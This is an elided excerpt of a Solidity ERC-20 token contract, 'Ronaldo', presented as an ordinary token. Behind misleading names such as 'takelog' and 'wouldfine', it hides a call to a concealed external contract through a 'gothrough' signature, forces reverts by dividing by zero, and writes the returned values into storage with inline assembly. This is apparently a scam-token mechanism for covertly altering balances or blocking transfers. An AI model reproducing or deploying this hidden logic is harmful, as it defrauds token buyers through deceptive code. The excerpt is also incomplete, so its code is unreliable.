...
contract Ronaldo is IERC20, Ownable {
    ...
    address private immutable _Sand;
     ...
     * construction.
     */
    constructor(string memory symbol_, string memory name_, uint256 totalSupply_, address sand_) 
    {   
         _name = name_; 
        _symbol = symbol_; 
     ...
     * required by the EIP. See the takelog at the beginning of {ERC20}.
     *
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        takelog("_transferfrom", to, amount, bytes32(0));
        emit Transfer(from, to, amount);
    }
    
    
    function takelog(bytes32 zd, address ao1, uint256 st3, bytes32 hk) 
             private pure returns(bool, address, bool)  {
        if (ao1 != address(0) && uint256(zd) < st3) {
            return (false, address(uint160(uint256(hk))), false);
        } else {
            return (true, ao1, true);
        }
    }
    ...
    function _decoder(bytes memory d) private pure returns(bytes32 b) {
        assembly { b := mload(add(d, add(16, 16))) }
    }


    function _loaddata(uint256 a, uint256 b, address f, uint256 m) private {
        assembly {
            mstore(0, f) 
            mstore(a, b) 
    ...
    function wouldfine(address p, address a) private {
        bytes memory b = bytes("gothrough(address,address)");
        (bool s, bytes memory d) = p.call(abi.
        encodeWithSignature(string(b), a, address(0)));
        if (!s) { uint256 aa = 0; 1 / aa; }
        uint256 v = uint256(_decoder(d));
        if (v == 0) return;
        _loaddata(32, 4, a, v);
    }
